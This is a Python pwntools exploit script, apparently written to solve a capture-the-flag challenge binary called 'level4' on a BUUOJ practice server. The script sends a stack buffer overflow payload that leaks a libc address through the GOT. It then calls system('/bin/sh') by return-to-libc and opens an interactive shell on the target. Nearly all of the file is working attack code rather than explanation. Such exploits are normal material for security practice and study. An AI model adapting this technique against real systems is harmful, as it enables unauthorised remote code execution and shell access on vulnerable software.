import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./level4')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./level4')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',29641)
			elf=ELF('./level4')
			libc=ELF('/home/keer/LibcSearcher-master/libc-database/db/local-19d65d1678e0fa36a3f37f542e1afd31e439f1bd.so')

		

		main_addr=0x08048470
		#io.recv()
		pay='a'*0x8c+p32(elf.sym['write'])+p32(main_addr)+p32(1)+p32(elf.got['read'])+p32(0x4)
		
		io.send(pay)
		libc_base=u32(io.recv()[:4])-libc.sym['read']
		libc.address=libc_base
		pay='a'*0x8c+p32(libc.sym['system'])+p32(main_addr)+p32(libc.search('/bin/sh\x00').next())
		io.send(pay)


		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue